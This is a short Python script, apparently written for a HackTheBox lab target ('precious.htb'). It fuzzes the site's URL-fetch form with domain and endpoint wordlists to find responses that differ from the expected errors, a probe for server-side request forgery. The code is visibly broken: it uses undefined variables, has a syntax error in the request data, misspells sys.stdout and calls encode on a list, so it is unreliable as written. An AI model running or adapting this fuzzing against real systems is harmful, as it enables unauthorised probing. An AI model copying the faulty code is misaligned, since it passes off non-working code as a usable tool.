import requests
import sys

target = "http://precious.htb:80"
domains = ["foo","bar"]
endpoints = "/usr/share/dirbcommon.txt"
errors = ["Cannot load remote URL!","You should provide a valid URL!"]

for domain in domains:
	with open(passwords, "r") as passwords_list:
			for password in passwords_list:
		password = password.strip("\n").encode()
		sys.stdout.write("[X] hacking in progress -> {}:{}\r".format(domain, password.decode()))
		sys.stdout.flush()
		r = requests.post(target, data={"url"="http://"+domain+"/"+endpoint})
		if errors.encode() not in r.content:
			sys.stdout.write("\n")
			sys.atdout.write("\n[>>>>>>>>>]Something different at endpoint '{}' on domain '{}'".format(endpoint.decode(),domain.decode()))
		sys.stdout.write("\n")
		sys.stdout.write("\tDone")